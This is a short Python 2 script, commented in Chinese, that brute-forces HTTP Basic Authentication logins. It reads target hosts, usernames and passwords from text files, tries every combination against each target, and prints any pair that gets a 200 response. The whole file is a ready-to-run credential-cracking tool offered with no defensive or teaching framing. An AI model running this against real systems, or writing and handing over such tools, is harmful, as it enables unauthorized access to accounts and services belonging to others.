#!/usr/bin/env python
#!encoding:utf-8
#利用requests对认证的页面进行爆破

import requests

user_file = 'usr.txt'
pass_file = 'psd.txt'
url_file  = 'url.txt'

def crack(target,user,password):
    
    #proxies   = dict(http='http://127.0.0.1:8080')
    try:
	r = requests.get(target,auth=(user,password))
	if r.status_code == 200:
	    print("[+] Found:" + target + " auth --> " + str(user) + ' : '\
		    + str(password))
    except:
	pass

def main():
    
    url_list = []
    with open(url_file,'r') as f:
	for url in f.readlines():
	    url_list.append(url.rstrip())

    for target in url_list:
	target = 'http://' + target
	print target
	with open(user_file,'r') as uf:
	    for user in uf.readlines():
		user = user.rstrip()
		with open(pass_file,'r') as pf:
		    for password in pf.readlines():
			password = password.rstrip()
			crack(target,user,password)

if __name__ == '__main__':
    main()
